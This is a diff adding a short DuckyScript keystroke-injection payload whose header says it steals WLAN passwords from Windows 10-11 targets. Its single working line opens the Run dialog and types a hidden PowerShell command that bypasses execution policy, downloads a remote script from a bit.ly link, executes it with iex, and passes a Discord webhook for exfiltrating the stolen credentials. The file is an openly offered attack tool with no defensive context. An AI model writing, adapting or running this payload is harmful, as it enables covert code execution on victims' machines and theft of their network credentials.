@@ -1,0 +1,15 @@
+REM ###################################################################
+REM #                                                                 |
+REM # Title        : WLAN-Windows-Passwords-Discord-Exfiltration      |
+REM # Author       : Aleff                                            |
+REM # Description: A script used to stole target WLAN Passwords.      |
+REM # Category     : Credentials                                      |
+REM # Target       : Windows 10-11                                    |
+REM # Version      : 1.0                                              |
+REM #                                                                 |
+REM ###################################################################
+
+DELAY 2000
+GUI r
+DELAY 250
+STRINGLN powershell -w h -ep bypass $discord='<your_webhook_here>';irm bit.ly/WindowsWiFiPasswordsENG | iex
